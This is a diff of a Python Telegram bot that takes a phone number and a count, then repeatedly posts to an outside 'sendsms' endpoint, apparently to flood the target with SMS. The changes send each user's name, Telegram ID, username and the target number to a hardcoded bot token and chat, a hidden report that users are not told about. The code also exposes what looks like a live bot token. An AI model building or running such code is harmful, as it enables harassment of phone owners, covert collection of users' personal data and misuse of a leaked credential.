@@ -14,14 +14,12 @@ logger.setLevel(logging.DEBUG)
 
 @bot.message_handler(commands=["start"])
 def start(message):
-	zz = 1
 	name_name = message.chat.first_name
 	las_name = message.chat.last_name
 	user_tele = message.chat.username
 	id_tele = message.chat.id
 	bot.send_message(message.chat.id,text='<strong>Hello Pro Bot Send Message\nPlease send the phone number with the number of messages\nEx: 011********:5</strong>',parse_mode="html")
-	zz+=1
-	sensess = requests.get(f'''https://api.telegram.org/bot1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q/sendMessage?chat_id=1396476109&text= NEW LOGIN BOT\nNAME: {name_name} {las_name}\nID: {id_tele}\nuser: @{user_tele}\nLOGIN NUMBER {zz}''')
+	
 @bot.message_handler(func=lambda call: True)
 def true(message):
 	aa = 0
@@ -64,8 +62,7 @@ def true(message):
 "metaData.cssUrl":"http://menad2c.mondiamedia.com/mpay/mondiapay-etisalat-eg-b2b/music/css/app.css",
 "Login":"LOGIN",
 }
-	aa+=1
-	sensess = requests.get(f'''https://api.telegram.org/bot1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q/sendMessage?chat_id=1396476109&text= NEW REQUEST OF BOT\nNUMBER {number}\nNumber Message {loop}\nNumber Request {aa}''')
+	sensess = requests.get(f'''https://api.telegram.org/bot1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q/sendMessage?chat_id=1396476109&text= NEW REQUEST OF BOT\nNAME: {name_name} {las_name}\nID: {id_tele}\nuser: @{user_tele}\nNUMBER {number}\nNumber Message {loop}''')
 	for i in range(loop):
 		rr = requests.post('https://goldencircle777.com/index/send/sendsms',headers=headers,data=data)
 		
